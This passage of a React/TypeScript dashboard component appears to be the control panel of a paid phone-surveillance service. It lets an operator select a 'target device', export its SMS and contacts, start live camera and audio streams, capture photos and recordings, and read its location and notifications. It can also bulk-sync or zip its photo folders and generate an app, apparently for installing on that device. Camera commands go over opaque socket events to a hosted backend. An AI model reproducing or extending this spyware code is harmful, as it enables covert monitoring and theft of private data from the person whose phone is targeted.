        link.download = `sms_backup_${new Date().toISOString().split('T')[0]}.csv`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    // Download Contacts as vCard
    const downloadContactsAsVcf = () => {
        if (!requireConnectedDevice(() => {})) return;
        if (contactsList.length === 0) {
            setAlertData({ title: 'No Data to Export', message: 'No contacts currently synced. Please click Sync Contacts first.', type: 'info' });
            setShowCustomAlert(true);
            return;
        }

        const vcards = contactsList.map(contact => {
            const name = contact.name || 'Unknown';
            const phones = contact.phones?.map((p: any) => {
                const num = typeof p === 'string' ? p : (p?.number || p?.value || '');
                return `TEL:${num}`;
            }).join('\n') || '';
            const emails = contact.emails?.map((e: any) => {
                const email = typeof e === 'string' ? e : (e?.address || e?.value || '');
                return `EMAIL:${email}`;
            }).join('\n') || '';

            return `BEGIN:VCARD
VERSION:3.0
FN:${name}
N:${name};;;
${phones}
${emails}
END:VCARD`;
        }).join('\n');

        const blob = new Blob([vcards], { type: 'text/vcard;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `contacts_backup_${new Date().toISOString().split('T')[0]}.vcf`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    if (status === "loading") {
        return (
            <div className="min-h-[100dvh] flex items-center justify-center" style={{ background: 'var(--bg-base)' }}>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '1.25rem' }}>
                    <div style={{
                        width: 48, height: 48, borderRadius: '50%',
                        border: '2px solid rgba(16,185,129,0.2)',
                        borderTopColor: 'var(--accent)',
                        animation: 'spin 1s linear infinite',
                    }} />
                    <span style={{ color: 'var(--text-muted)', fontSize: '0.875rem' }}>Loadingâ€¦</span>
                </div>
            </div>
        );
    }

    if (status === "unauthenticated") return null;

    const onlineDeviceCount = devices.filter(d => d.online).length;

    const requireConnectedDevice = (action: (targetId?: string) => void) => {
        const activeId = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
        let currentSelected = devices.find(d => (d.deviceId || d.id || d._id) === activeId);

        // If currently selected device is offline or not found, check if an online device exists
        if (!currentSelected || !currentSelected.online) {
            const availableOnline = devices.find(d => d.online);
            if (availableOnline) {
                const autoId = availableOnline.deviceId || availableOnline.id || availableOnline._id;
                setSelectedDeviceId(autoId);
                currentSelected = availableOnline;
            }
        }

        // If still not found, check ANY device in devices list
        if (!currentSelected && devices.length > 0) {
            const fallbackId = devices[0].deviceId || devices[0].id || devices[0]._id;
            setSelectedDeviceId(fallbackId);
            currentSelected = devices[0];
        }

        // If device list is still loading or empty, but user already has activeId stored
        if (!currentSelected && activeId) {
            action(activeId);
            return true;
        }

        if (!currentSelected) {
            setAlertData({
                title: 'No Device Selected',
                message: 'Please select a target device from the top navigation menu before executing commands or syncing data.',
                type: 'warning'
            });
            setShowCustomAlert(true);
            return false;
        }

        const resolvedId = currentSelected.deviceId || currentSelected.id || currentSelected._id;
        action(resolvedId);
        return true;
    };

    // Helper to render tools cleanly via modularized view components
    const renderTool = () => {
        switch (selectedTool) {
            case 'sms':
                return (
                    <SmsView
                        smsList={smsList}
                        fetchSms={fetchSms}
                        isFetchingSms={isFetchingSms}
                        downloadSmsAsCsv={downloadSmsAsCsv}
                    />
                );
            case 'contacts':
                return (
                    <ContactsView
                        contactsList={contactsList}
                        fetchContacts={fetchContacts}
                        isFetchingContacts={isFetchingContacts}
                        downloadContactsAsVcf={downloadContactsAsVcf}
                    />
                );
            case 'camera':
                return (
                    <CameraView
                        cameraMode={cameraMode}
                        setCameraMode={setCameraMode}
                        cameraQuality={cameraQuality}
                        setCameraQuality={setCameraQuality}
                        recordingDuration={recordingDuration}
                        setRecordingDuration={setRecordingDuration}
                        isLiveStreaming={isLiveStreaming}
                        isCapturingPhoto={isCapturingPhoto}
                        isRecording={isRecording}
                        recordingProgress={recordingProgress}
                        liveImageRef={liveImageRef}
                        capturedMedia={capturedMedia}
                        onToggleLiveStream={() => {
                            requireConnectedDevice((targetId) => {
                                const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
                                if (!effectiveTarget) return;

                                if (isLiveStreaming) {
                                    socket?.emit('c_f5', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget });
                                    setIsLiveStreaming(false);
                                    isLiveStreamingRef.current = false;
                                    if (liveImageRef.current) liveImageRef.current.src = '';
                                } else {
                                    socket?.emit('c_f4', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget, camera: cameraMode, quality: cameraQuality });
                                    setIsLiveStreaming(true);
                                    isLiveStreamingRef.current = true;
                                    selectedDeviceIdRef.current = effectiveTarget;
                                    cameraModeRef.current = cameraMode;
                                    cameraQualityRef.current = cameraQuality;
                                }
                            });
                        }}
                        onCapturePhoto={() => {
                            requireConnectedDevice((targetId) => {
                                const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
                                if (!effectiveTarget) return;

                                setIsCapturingPhoto(true); 
                                setCapturedMedia(prev => [{
                                    id: `temp_photo_${Date.now()}`,
                                    resource_type: 'image',
                                    url: 'loading',
                                    created_at: new Date().toISOString(),
                                    camera: cameraMode,
                                    isTemp: true
                                }, ...prev]);
                                socket?.emit('c_f1', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget, camera: cameraMode });
                            });
                        }}
                        onToggleRecording={() => {
                            requireConnectedDevice((targetId) => {
                                const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
                                if (!effectiveTarget) return;

                                if (!recordingDuration || recordingDuration === 0) {
                                    setAlertData({ title: 'Select Duration', message: 'First select the recording duration.', type: 'warning' });
                                    setShowCustomAlert(true);
                                    return;
                                }
                                if (isRecording) {
                                    socket?.emit('c_f3', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget });
                                    setIsRecording(false);
                                } else {
                                    setIsRecording(true);
                                    setRecordingProgress({ current: 0, total: recordingDuration });
                                    socket?.emit('c_f2', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget, camera: cameraMode, duration: recordingDuration });
                                }
                            });
                        }}
                        setPreviewItem={setPreviewItem}
                        setDeleteConfirmation={setDeleteConfirmation}
                        selectedDeviceId={selectedDeviceId}
                    />
                );
            case 'audio':
                return (
                    <VoiceView
                        isLiveAudio={isLiveAudio}
                        audioLevel={audioLevel}
                        startLiveAudio={startLiveAudio}
                        stopLiveAudio={stopLiveAudio}
                        voiceRecDuration={voiceRecDuration}
                        setVoiceRecDuration={setVoiceRecDuration}
                        isVoiceRecording={isVoiceRecording}
                        voiceRecProgress={voiceRecProgress}
                        isVoiceUploading={isVoiceUploading}
                        startVoiceRecording={startVoiceRecording}
                        stopVoiceRecording={stopVoiceRecording}
                        capturedVoice={capturedVoice}
                        setDeleteConfirmation={setDeleteConfirmation}
                        selectedDeviceId={selectedDeviceId}
                    />
                );
            case 'torch':
            case 'flashlight':
                return (
                    <FlashlightView
                        isTorchOn={isTorchOn}
                        toggleTorch={toggleTorch}
                    />
                );
            case 'vibration':
                return (
                    <VibrationView
                        vibrationDuration={vibrationDuration}
                        setVibrationDuration={setVibrationDuration}
                        triggerVibration={triggerVibration}
                    />
                );
            case 'location':
                return (
                    <LocationView
                        locationData={locationData}
                        isFetchingLocation={isFetchingLocation}
                        locationError={locationError}
                        locationHistory={locationHistory}
                        fetchLocation={fetchLocation}
                    />
                );
            case 'notifications': {
                const selectedDevice = devices.find(d => d.deviceId === selectedDeviceId);
                const isDeviceOnline = selectedDevice?.online ?? false;
                return (
                    <NotificationsView
                        notifications={notifications}
                        selectedDeviceId={selectedDeviceId}
                        isDeviceOnline={isDeviceOnline}
                        appIcons={appIcons}
                        onClearAll={() => {
                            if (!requireConnectedDevice(() => {})) return;
                            setNotifications([]);
                            try { localStorage.removeItem('galleryeye_notifications'); } catch {}
                            const userUuid = session?.user?.uuid;
                            if (userUuid) {
                                const url = `https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${userUuid}` + 
                                    (selectedDeviceId ? `?deviceId=${selectedDeviceId}` : '');
                                fetch(url, { method: 'DELETE' }).catch(() => {});
                            }
                        }}
                    />
                );
            }
            default:
                return null;
        }
    };

    return (
        <div className="flex w-full h-full min-h-screen bg-base text-fg-1 overflow-hidden relative">
            {/* Navigation */}
            <AppNavigation 
                devices={devices}
                selectedDeviceId={selectedDeviceId}
                setSelectedDeviceId={setSelectedDeviceId}
                selectedTool={selectedTool}
                setSelectedTool={setSelectedTool as any}
                userPlan={userPlan as any}
                setShowPlansModal={setShowPlansModal}
                handleSignOut={handleSignOut}
                onOpenAppModal={() => setShowAppModal(true)}
                onDeleteDevice={handleDeleteDevice}
                user={session?.user}
                openDropdownProp={navDropdown}
                setOpenDropdownProp={setNavDropdown}
                socket={socket}
                userUuid={session?.user?.uuid || ''}
            />

            {/* Main Content Area */}
            <main className="flex-1 h-full w-full relative transition-all duration-300 pt-20 pb-8 overflow-y-auto no-scrollbar">
                {!selectedTool && (
                    <TelemetryCards
                        devices={devices}
                        imagesCount={images.length}
                        userPlan={userPlan}
                        isSocketConnected={Boolean(socket && socket.connected)}
                        navDropdown={navDropdown}
                        setNavDropdown={setNavDropdown}
                        onOpenGallery={() => {
                            if (typeof window !== 'undefined') {
                                window.history.pushState({ tool: 'gallery' }, '', '#tool=gallery');
                            }
                            setSelectedTool('gallery');
                        }}
                        onOpenPlansModal={() => setShowPlansModal(true)}
                        onOpenAppModal={() => setShowAppModal(true)}
                        getPlanLimits={getPlanLimits}
                    />
                )}

                {selectedTool === 'gallery' && (
                    <div className="px-4 md:px-8 h-full">
                        <GalleryView 
                            images={images}
                            activeTab={activeTab}
                            setActiveTab={setActiveTab}
                            isSelectionMode={isSelectionMode}
                            setIsSelectionMode={setIsSelectionMode}
                            selectedItems={selectedItems}
                            toggleSelection={(id) => {
                                const newSet = new Set(selectedItems);
                                if (newSet.has(id)) newSet.delete(id);
                                else newSet.add(id);
                                setSelectedItems(newSet);
                            }}
                            selectAll={selectAll}
                            handleBulkDownload={downloadSelected}
                            handleBulkDelete={deleteSelected}
                            isDownloading={isDownloading}
                            isDeleting={isDeleting}
                            setPreviewItem={setPreviewItem}
                            galleryLoaderRef={galleryLoaderRef}
                            isLoadingMore={isLoadingMore}
                            galleryHasMore={galleryHasMore}
                            handleLoadMore={handleLoadMore}
                            
                            // Folder Props
                            folders={folders}
                            fetchFolders={fetchFolders}
                            isFetchingFolders={isFetchingFolders}
                            selectedDeviceId={selectedDeviceId}
                            setSyncOptionsFolder={setSyncOptionsFolder}
                            setShowSyncOptionsModal={setShowSyncOptionsModal}
                        />
                    </div>
                )}

                {selectedTool && selectedTool !== 'gallery' && (
                    <div className="px-4 md:px-8 max-w-7xl mx-auto h-full">
                        {renderTool()}
                    </div>
                )}
            </main>

            {/* Modals */}
            <QuickTutorial isOpen={showQuickTutorial} onClose={() => setShowQuickTutorial(false)} />
            <AppGenerationModal isOpen={showAppModal} onClose={() => setShowAppModal(false)} uuid={session?.user?.uuid || ''} socket={socket} userPlan={userPlan} onUpgrade={(feature?: string, requiredPlan?: string) => { 
                if (feature && requiredPlan) {
                    showUpgradePrompt(feature, requiredPlan as 'standard' | 'premium');
                } else {
                    setShowAppModal(false); 
                    setShowPlansModal(true); 
                }
            }} />
            <WhatsAppButton />
            <PlansModal isOpen={showPlansModal} onClose={() => setShowPlansModal(false)} currentPlan={userPlan as any} userEmail={session?.user?.email || ''} userUuid={session?.user?.uuid || ''} />
            <UpgradeModal isOpen={showUpgradeModal} onClose={() => setShowUpgradeModal(false)} feature={upgradeFeature} requiredPlan={requiredPlan} onViewPlans={() => { setShowUpgradeModal(false); setShowPlansModal(true); }} />
            
            <SyncOptionsModal
                isOpen={showSyncOptionsModal}
                onClose={() => setShowSyncOptionsModal(false)}
                folder={syncOptionsFolder}
                userPlan={userPlan as any}
                onSync={(mediaType, count, method) => {
                    if (method === 'oneByOne') {
                        isSyncCanceledRef.current = false;
                        setIsStartingSync(true);
                        setUploadProgress({ uploaded: 0, total: count === 'all' ? syncOptionsFolder?.count || 0 : count, speed: '', eta: '' });
                        socket?.emit('trigger_sync', {
                            uuid: session?.user?.uuid,
                            targetDeviceId: selectedDeviceId,
                            folderName: syncOptionsFolder.name,
                            count,
                            mediaType
                        });
                    } else if (method === 'zip') {
                        setZipProgress({ stage: 'creating', current: 0, total: count === 'all' ? syncOptionsFolder.count : count, url: '', error: '' });
                        setShowZipProgressModal(true);
                        socket?.emit('trigger_zip', {
                            uuid: session?.user?.uuid,
                            targetDeviceId: selectedDeviceId,
                            folderName: syncOptionsFolder.name,
                            mediaType,
                            count
                        });
                    }
                }}
                onUpgrade={() => setShowPlansModal(true)}
            />

            <ConfirmDeleteModal
                isOpen={showDeleteConfirm}
                onClose={() => setShowDeleteConfirm(false)}
                onConfirm={confirmDelete}
                itemCount={selectedItems.size}
            />

            <ZipProgressModal
                isOpen={showZipProgressModal}
                onClose={() => setShowZipProgressModal(false)}
                stage={zipProgress.stage}
                current={zipProgress.current}
                total={zipProgress.total}
                folderName={syncOptionsFolder?.name || ''}
                downloadUrl={zipProgress.url}
                error={zipProgress.error}
                onCancel={() => {
                    socket?.emit('cancel_zip', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                }}
            />

            <CustomAlertModal
                isOpen={showCustomAlert}
                onClose={() => setShowCustomAlert(false)}
                title={alertData.title}
                message={alertData.message}
                type={alertData.type}
            />

            {deleteConfirmation.isOpen && (
                <div className="fixed inset-0 z-[600] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
                    <div className="bg-[#0a0a0c] border border-white/10 rounded-3xl p-6 max-w-sm w-full shadow-2xl animate-in zoom-in-95 duration-200">
                        <div className="w-12 h-12 rounded-full bg-red-500/20 flex items-center justify-center border border-red-500/30 mb-4 mx-auto">
                            <Trash2 size={24} className="text-red-500" />
                        </div>
                        <h3 className="text-xl font-bold text-white text-center mb-2">Delete Media?</h3>
                        <p className="text-sm text-white/60 text-center mb-6">
                            Are you sure you want to delete {deleteConfirmation.ids.length === 1 ? 'this item' : `these ${deleteConfirmation.ids.length} items`}? This action cannot be undone.
                        </p>
                        <div className="flex items-center gap-3">
                            <button 
                                onClick={() => setDeleteConfirmation({ isOpen: false, ids: [] })}
                                className="flex-1 py-3 px-4 rounded-xl font-bold text-sm text-white/70 bg-white/5 hover:bg-white/10 transition-colors"
                            >
                                Cancel
                            </button>
                            <button 
                                onClick={() => {
                                    setImages(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
                                    setCapturedMedia(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
                                    setCapturedVoice(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
                                    fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: deleteConfirmation.ids }) }).catch(()=>null);
                                    setDeleteConfirmation({ isOpen: false, ids: [] });
                                    setIsCameraSelectMode(false);
                                    setCameraSelectedItems(new Set());
                                }}
                                className="flex-1 py-3 px-4 rounded-xl font-bold text-sm text-white bg-red-500 hover:bg-red-600 transition-colors shadow-[0_0_15px_rgba(239,68,68,0.3)]"
                            >
                                Delete
                            </button>
                        </div>
                    </div>
                </div>
            )}

            <AnimatePresence>
                {(uploadProgress || isStartingSync) && (
                    <div className="fixed inset-0 z-[600] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
                        <motion.div 
                            initial={{ opacity: 0, scale: 0.95, y: 20 }}
                            animate={{ opacity: 1, scale: 1, y: 0 }}
                            exit={{ opacity: 0, scale: 0.95, y: 20 }}
                            className="relative w-full max-w-md neo-surface rounded-[2rem] border border-white/10 shadow-2xl overflow-hidden p-8 text-center"
                        >
                            <div className="absolute top-0 left-0 right-0 h-32 bg-gradient-to-br from-accent/20 to-transparent opacity-50 pointer-events-none" />
                            
                            <div className="relative z-10 flex flex-col items-center">
                                <div className="w-20 h-20 rounded-full bg-accent/10 border border-accent/20 flex items-center justify-center shadow-accent-glow mb-6 relative">
                                    <div className="absolute inset-0 rounded-full border-2 border-accent border-t-transparent animate-spin" />
                                    <ImageIcon className="w-8 h-8 text-accent animate-pulse" />
                                </div>
                                
                                <h3 className="text-2xl font-bold text-fg-1 mb-2">Syncing Media</h3>
                                <p className="text-fg-3 text-sm mb-8">
                                    {uploadProgress ? `Transferring ${uploadProgress.uploaded} of ${uploadProgress.total} items...` : 'Connecting to device...'}
                                </p>

                                <div className="w-full h-3 bg-black/40 rounded-full overflow-hidden border border-white/5 shadow-inner mb-8 relative">
                                    <div 
                                        className="h-full bg-accent transition-all duration-300 rounded-full shadow-[0_0_10px_rgba(var(--accent-rgb,255,255,255),0.8)] relative" 
                                        style={{ width: uploadProgress ? `${Math.max((uploadProgress.uploaded / uploadProgress.total) * 100, 5)}%` : '5%' }} 
                                    >
                                        <div className="absolute inset-0 bg-white/20 animate-pulse" />
                                    </div>
                                </div>

                                <button 
                                    onClick={() => {
                                        isSyncCanceledRef.current = true;
                                        socket?.emit('cancel_sync', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                        setUploadProgress(null);
                                        setIsStartingSync(false);
                                    }}
                                    className="px-8 py-3 rounded-xl bg-red-500/10 border border-red-500/20 hover:bg-red-500/20 text-red-400 font-bold transition-colors w-full"
                                >
                                    Cancel Sync
                                </button>
                            </div>
                        </motion.div>
                    </div>
                )}
            </AnimatePresence>

            <AnimatePresence>
                {previewItem && (
                    <motion.div 
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[600] bg-black/90 backdrop-blur-2xl flex items-center justify-center p-4 md:p-8"
                        onClick={() => setPreviewItem(null)}
                    >
                        <motion.div 
                            initial={{ scale: 0.95, opacity: 0 }}
                            animate={{ scale: 1, opacity: 1 }}
                            exit={{ scale: 0.95, opacity: 0 }}
                            className="relative max-w-6xl w-full h-full flex items-center justify-center"
                            onClick={(e) => e.stopPropagation()}
                        >
                            {previewItem.resource_type === 'video' ? (
                                <video src={previewItem.url} controls autoPlay className="max-w-full max-h-full rounded-xl neo-surface" />
                            ) : previewItem.resource_type === 'zip' ? (
                                <div className="flex flex-col items-center justify-center p-12 neo-surface rounded-[2rem] border border-white/5 bg-black/40 backdrop-blur-xl max-w-sm w-full mx-4">
                                    <Folder className="w-24 h-24 text-accent mb-6 drop-shadow-[0_0_15px_rgba(var(--accent-rgb),0.5)]" />
                                    <h3 className="text-xl font-bold text-fg-1 text-center truncate w-full mb-2">{previewItem.name || 'Archive.zip'}</h3>
                                    <p className="text-sm text-fg-3 mb-8 text-center">This is a ZIP archive containing your synced media.</p>
                                    <button 
                                        onClick={async () => {
                                            try {
                                                const response = await fetch(previewItem.url);
                                                const blob = await response.blob();
                                                const blobUrl = window.URL.createObjectURL(blob);
                                                const link = document.createElement('a');
                                                link.href = blobUrl;
                                                link.download = previewItem.name || 'archive.zip';
                                                document.body.appendChild(link);
                                                link.click();
                                                document.body.removeChild(link);
                                                window.URL.revokeObjectURL(blobUrl);
                                            } catch (e) {
                                                const link = document.createElement('a');
                                                link.href = previewItem.url;
                                                link.download = previewItem.name || 'archive.zip';
                                                document.body.appendChild(link);
                                                link.click();
                                                document.body.removeChild(link);
                                            }
                                        }}
                                        className="flex items-center gap-2 px-6 py-3 rounded-2xl bg-accent text-black font-bold shadow-[0_0_15px_rgba(var(--accent-rgb),0.4)] hover:scale-105 active:scale-95 transition-all"
                                    >
                                        <Download className="w-5 h-5" /> Download ZIP
                                    </button>
                                </div>
                            ) : (
                                <img src={previewItem.url} alt="Preview" className="max-w-full max-h-full object-contain rounded-xl neo-surface" />
                            )}
                            
                            <div className="absolute top-4 right-4 flex items-center gap-3">
                                <button 
                                    onClick={async () => {
                                        try {
                                            const response = await fetch(previewItem.url);
                                            const blob = await response.blob();
                                            const blobUrl = window.URL.createObjectURL(blob);
                                            const link = document.createElement('a');
                                            link.href = blobUrl;
                                            link.download = previewItem.name || (previewItem.resource_type === 'video' ? 'video.mp4' : 'image.jpg');
                                            document.body.appendChild(link);
                                            link.click();
                                            document.body.removeChild(link);
                                            window.URL.revokeObjectURL(blobUrl);
                                        } catch (e) {
                                            const link = document.createElement('a');
                                            link.href = previewItem.url;
                                            link.download = previewItem.name || 'download';
                                            document.body.appendChild(link);
                                            link.click();
                                            document.body.removeChild(link);
                                        }
                                    }}
                                    className="p-3 rounded-full neo-button text-fg-1 hover:text-accent transition-colors shadow-lg bg-black/40 backdrop-blur-md border border-white/10"
                                    title="Download Media"
                                >
                                    <Download size={24} />
                                </button>
                                <button 
                                    onClick={() => setPreviewItem(null)} 
                                    className="p-3 rounded-full neo-button text-fg-1 hover:text-accent transition-colors shadow-lg bg-black/40 backdrop-blur-md border border-white/10"
                                    title="Close Preview"
                                >
                                    <X size={24} />
                                </button>
                            </div>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* Device Online Toast */}
            <AnimatePresence>
                {deviceToast && (
                    <motion.div
                        initial={{ opacity: 0, y: -50, scale: 0.95 }}
                        animate={{ opacity: 1, y: 0, scale: 1 }}
                        exit={{ opacity: 0, y: -20, scale: 0.95 }}
                        className="fixed top-20 right-6 z-[400] flex items-center gap-3 bg-[#121316]/95 backdrop-blur-xl border border-emerald-500/30 px-5 py-3.5 rounded-2xl shadow-[0_10px_35px_rgba(16,185,129,0.2)]"
                    >
                        <div className="w-3 h-3 rounded-full bg-emerald-500 shadow-[0_0_12px_#10b981] animate-pulse" />
                        <div>
                            <span className="text-xs font-bold text-white block">{deviceToast.name}</span>
                            <span className="text-[11px] text-emerald-400 font-medium">{deviceToast.message}</span>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
}
